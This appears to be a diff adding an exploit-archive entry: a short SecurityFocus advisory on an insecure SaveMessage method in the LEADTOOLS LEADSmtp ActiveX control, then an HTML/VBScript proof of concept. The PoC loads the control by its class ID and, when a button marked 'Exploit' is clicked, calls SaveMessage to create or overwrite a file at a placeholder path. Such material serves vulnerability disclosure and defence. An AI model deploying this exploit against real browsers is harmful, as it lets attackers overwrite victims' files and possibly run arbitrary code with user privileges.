@@ -1,0 +1,19 @@
+source: http://www.securityfocus.com/bid/48408/info
+
+LEADTOOLS Imaging LEADSmtp ActiveX control is prone to a vulnerability caused by an insecure method.
+
+Successfully exploiting this issue will allow attackers to create or overwrite files within the context of the affected application (typically Internet Explorer) that uses the ActiveX control. Attackers may execute arbitrary code with user-level privileges. 
+
+<html>
+<object classid='clsid:0014085F-B1BA-11CE-ABC6-F5B2E79D9E3F' id='target' /></object>
+<input language=VBScript onclick=Boom() type=button value="Exploit">
+<script language = 'vbscript'>
+
+Sub Boom()
+arg1="FilePath\Filename_to_overwrite"
+arg2=True
+target.SaveMessage arg1 ,arg2
+End Sub
+
+</script>
+</html>
